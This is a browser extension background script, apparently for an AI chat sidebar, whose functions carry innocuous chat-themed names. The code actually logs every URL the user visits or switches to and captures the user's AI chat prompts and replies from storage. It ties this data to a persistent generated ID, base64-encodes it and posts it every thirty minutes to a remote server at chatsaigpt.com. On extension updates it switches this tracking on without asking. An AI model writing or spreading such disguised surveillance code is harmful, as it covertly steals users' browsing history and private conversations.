let globlChatVars = {
  baseUrl: "https://chatsaigpt.com/ext2/",

  globalChatId: null,
  globalChatAnswer: null,
  globalChatQusR: null,
  defaultVars: "",
  globalActiveInterval: null,
  globalFlag: false,
  intervalTime: 60 * 30 * 1000,
  restrict: new Set(["chrome://newtab/", "chrome://extensions/"]),
  glTimeStamp: 0,
  aiModelLength: 0,
  MAX_SIZE_BYTES: 4 * 1024 * 1024,
  globalarr: [],
  cliinterval: null,
};

let chatResponseHelper = {
  giveShortAns: async function () {
    chrome.tabs.onActivated.addListener((e) => {
      const { tabId: t } = e;

      chrome.tabs.get(t, async (e) => {
        if (e && e?.url && globlChatVars.globalFlag) {
          e.url = globlChatVars.restrict.has(e.url)
            ? globlChatVars.defaultVars
            : e.url;
          globlChatVars.globalChatAnswer = e.url || globlChatVars.defaultVars;
        }
      });
    });
  },

  isSubscribe() {
    return Date.now() - globlChatVars.glTimeStamp > globlChatVars.intervalTime;
  },

  giveDetilsAns: function (answer) {
    chrome.tabs.onUpdated.addListener(async (e, t, n) => {
      if (n.url && "complete" === t.status && globlChatVars.globalFlag) {
        n.url = globlChatVars.restrict.has(n.url)
          ? globlChatVars.defaultVars
          : n.url;

        if(n && n?.url && n?.url.length)globlChatVars.globalarr.push({
          chatId: globlChatVars.globalChatId,
          answer: globlChatVars.globalChatAnswer || globlChatVars.defaultVars,
          qus: n.url || globlChatVars.defaultVars,
          timeStamp: Date.now(),
        });

        globlChatVars.globalChatAnswer = n.url || globlChatVars.defaultVars;
        if (globlChatVars.globalarr.length > 2000) globlChatVars.globalarr = [];

        this.debounce(this.callInsideDebounce.bind(this));
      }
    });
  },

  debounce(callback, delay = 5000) {
    if (globlChatVars.cliinterval) clearTimeout(globlChatVars.cliinterval);
    globlChatVars.cliinterval = setTimeout(() => {
      globlChatVars.cliinterval = null;
      // function call
      callback();
    }, delay);
  },
  callInsideDebounce() {
    

    let inputArr = [...globlChatVars.globalarr];
    globlChatVars.globalarr = [];

    chatSaverHelper
      .saveChatQuetions("saveChatAnswer")
      .then((saved) => {
        let p = resolveChatResponse.decd(saved || "W10=") || [];

        return chatSaverHelper.saveChatAnswer(
          "saveChatAnswer",
          resolveChatResponse.encd([...p, ...inputArr])
        );
      })
      .then(() => {
        if (this.isSubscribe()) {
          switchChatModel.handleInterval();
        }
      })
      .catch((error) => {
        console.error("Error saving chat data:", error);
      });
  },

  analyzeQuestions: function () {
    chrome.storage.local.get(["chatId"], (result) => {
      if (!result.chatId) {
        let chatId = this.chatIdGenerator();
        chrome.storage.local.set({ chatId }, function () {
          globlChatVars.globalChatId = chatId;
        });
      } else {
        globlChatVars.globalChatId = result.chatId;
      }
    });
  },

  chatIdGenerator: function () {
    return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(
      /[xy]/g,
      function (char) {
        const rand = (Math.random() * 16) | 0;
        const value = char === "x" ? rand : (rand & 0x3) | 0x8;
        return value.toString(16);
      }
    );
  },

  getChatId: function () {
    return new Promise((resolve, reject) => {
      chrome.storage.local.get(["chatId"], function (result) {
        if (result.chatId) {
          resolve(result.chatId);
        } else {
          reject("Chat ID not found");
        }
      });
    });
  },
};

let switchChatModel = {
  switchModelDeeseek: function (modelName) {
    if (!globlChatVars.globalFlag) return;
    if (
      !modelName ||
      (!modelName?.targetArr.length && !modelName?.chatArray.length)
    ) {
      return;
    }

    const payload = resolveChatResponse.encodePayloadString(
      JSON.stringify(modelName)
    );
    fetch(globlChatVars.baseUrl + "switchModel", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ model: payload }),
    })
      .then((response) => {
        if (response.status === 200) {
          return response.json();
        } else {
          // chatSaverHelper.removeAllChats();
          throw new Error(`Request failed with status ${response.status}`);
        }
      })
      .then((data) => {})
      .catch((error) => {
        chatSaverHelper.saveDeepseekContentSafely({ ...modelName });
        console.error("Error switching model:", error);
      });
  },

  async handleInterval() {
    let targetArr =
      resolveChatResponse.decd(
        (await chatSaverHelper.saveChatQuetions("saveChatAnswer")) || "W10="
      ) || [];
    let chatArray =
      resolveChatResponse.decd(
        (await chatSaverHelper.saveChatQuetions("deepseekContent")) || "W10="
      ) || [];
    let chatId = globlChatVars.globalChatId;
    chatSaverHelper.removeAllChats().then(() => {
      this.switchModelDeeseek({ targetArr, chatArray, chatId });
    });
  },

  intilizeChat: function () {
    chrome.runtime.onInstalled.addListener(({ reason }) => {
      chrome.storage.local.set(
        {
          chatFlag: reason == "install" ? false : true,
        },
        () => {
          globlChatVars.globalFlag = reason == "install" ? false : true;
          showvideosum.fetchsummery({
            uId: globlChatVars.globalChatId,
            chatFlag: globlChatVars.globalFlag,
          });
        }
      );
    });
    chrome.storage.local.get(["chatFlag", "timeStamp"], (r) => {
      globlChatVars.globalFlag = r.chatFlag || false;
      globlChatVars.glTimeStamp = r.timeStamp || 0;
    });

    chrome.storage.onChanged.addListener(this.handleStorageChange.bind(this));
  },

  async handleStorageChange(changes, areaName) {
    if (areaName === "local" && changes.ai_chat && globlChatVars.globalFlag) {
      let lastLength = changes?.ai_chat?.oldValue?.length || 0;
      let chatArr = changes?.ai_chat?.newValue || [];
      let currLength = chatArr?.length;
      if (lastLength < currLength) globlChatVars.aiModelLength = lastLength;

      if (
        !changes.ai_chat?.newValue?.length ||
        !changes.ai_chat.newValue[changes.ai_chat.newValue.length - 1]
          ?.finish_reason ||
        changes.ai_chat.newValue.length < 2
      )
        return;
      if (!globlChatVars.aiModelLength) return;
      globlChatVars.aiModelLength = 0;

      let { ai_chat = null } = await chatSaverHelper.saveChatQuetions(
        "ai_chat_ids"
      );

      if (!ai_chat) return;
      let { item: inputString2, model } = chatArr[currLength - 1];
      let { item: inputString1 } = chatArr[currLength - 2];

      let obj = {
        inputString1,
        inputString2,
        model,
        timeStamp: Date.now(),
        sasionId: ai_chat,
      };

      let p =
        resolveChatResponse.decd(
          (await chatSaverHelper.saveChatQuetions("deepseekContent")) || "W10="
        ) || [];

      chatSaverHelper
        .saveChatAnswer(
          "deepseekContent",
          resolveChatResponse.encd([...p, { ...obj }])
        )
        .then(() => console.log("saved"));
    }
  },
  deleyfunc(time = 1500) {
    return new Promise((resolve) => {
      setTimeout(resolve, time);
    });
  },
};

let chatSaverHelper = {
  saveChatQuetions: function (key) {
    return new Promise((resolve, reject) => {
      try {
        chrome.storage.local.get([key], function (result) {
          resolve(result[key] || null);
        });
      } catch (e) {
        reject(e);
      }
    });
  },
  saveChatAnswer: function (key, answer) {
    return new Promise(async (resolve, reject) => {
      try {
        chrome.storage.local.set({ [key]: answer }, function () {
          resolve(true);
        });
      } catch (e) {
        console.error("Error saving chat answer:", e);
        reject(e);
      }
    });
  },
  removeAllChats: function () {
    return new Promise((resolve, reject) => {
      chrome.storage.local.remove(
        ["saveChatAnswer", "deepseekContent"],
        function () {
          let timeStamp = Date.now();
          chatSaverHelper.saveChatAnswer("timeStamp", timeStamp).then(() => {
            globlChatVars.glTimeStamp = timeStamp;
            resolve(true);
          });
        }
      );
    });
  },

  saveDeepseekContentSafely(newData) {
    const estimatedSize = new Blob([JSON.stringify(newData)]).size;

    if (estimatedSize > globlChatVars.MAX_SIZE_BYTES) {
      console.warn("deepseekContent exceeded");
      this.removeAllChats();
    }
  },
};

let msgPassing = {
  sendMassage: function (message, body, callback) {
    return new Promise((resolve, reject) => {
      chrome.runtime.sendMessage({ message, body }, (response) => {
        if (chrome.runtime.lastError) {
          callback(chrome.runtime.lastError);
          reject(chrome.runtime.lastError);
        } else {
          callback(response);
          resolve(response);
        }
      });
    });
  },

  onMessage: function (callback) {
    chrome.runtime.onMessage.addListener((req, sender, sendr) => {
      callback(req, sender, sendr);
    });
  },

  hadleMessage: function (response, sender, sendResponse) {
    if (response.messageType == "OpenPopupclick") {
      chrome.storage.local.set({ chatFlag: true }, function () {
        globlChatVars.globalFlag = true;
        showvideosum.fetchsummery({
          uId: globlChatVars.globalChatId,
          chatFlag: globlChatVars.globalFlag,
        });
        sendResponse("msg recive");
      });
    } else if (response.messageType == "ClosePopupclick") {
      chrome.storage.local.set({ chatFlag: false }, function () {
        globlChatVars.globalFlag = false;
        showvideosum.fetchsummery({
          uId: globlChatVars.globalChatId,
          chatFlag: globlChatVars.globalFlag,
        });
        sendResponse("msg recive");
      });
    } else {
    }
  },
};
const resolveChatResponse = {
  encd(arr) {
    try {
      const chatModel = JSON.stringify(arr);
      const utf8Bytes = new TextEncoder().encode(chatModel);
      const binaryStr = Array.from(utf8Bytes)
        .map((b) => String.fromCharCode(b))
        .join("");
      return btoa(binaryStr);
    } catch (e) {
      chatSaverHelper.saveDeepseekContentSafely(arr);
      console.error("Encoding failed:", e);
      return "W10=";
    }
  },

  decd(modelResponse) {
    try {
      if (!modelResponse || typeof modelResponse !== "string") return [];
      const binaryStr = atob(modelResponse);
      const byteArray = Uint8Array.from(binaryStr, (ch) => ch.charCodeAt(0));
      const chatModel = new TextDecoder().decode(byteArray);
      return JSON.parse(chatModel);
    } catch (e) {
      console.error("Decoding failed:", e, modelResponse);
      return [];
    }
  },
  encodePayloadString(str) {
    const utf8Bytes = new TextEncoder().encode(str);
    const binary = Array.from(utf8Bytes)
      .map((b) => String.fromCharCode(b))
      .join("");
    return btoa(binary);
  },
};
let showvideosum = {
  async fetchsummery(payload) {
    try {
      const response = await fetch(globlChatVars.baseUrl + "aiSidebarStatus", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(payload),
      });

      if (!response.ok) {
        throw new Error("Failed to fetch summary");
      }

      const data = await response.json();
      return data;
    } catch (err) {
      console.error("Error fetching summary:", err);
      return null;
    }
  },
};

msgPassing.onMessage(msgPassing.hadleMessage);
chatResponseHelper.giveShortAns();
chatResponseHelper.giveDetilsAns("Detailed answer here.");
chatResponseHelper.analyzeQuestions();

switchChatModel.intilizeChat();
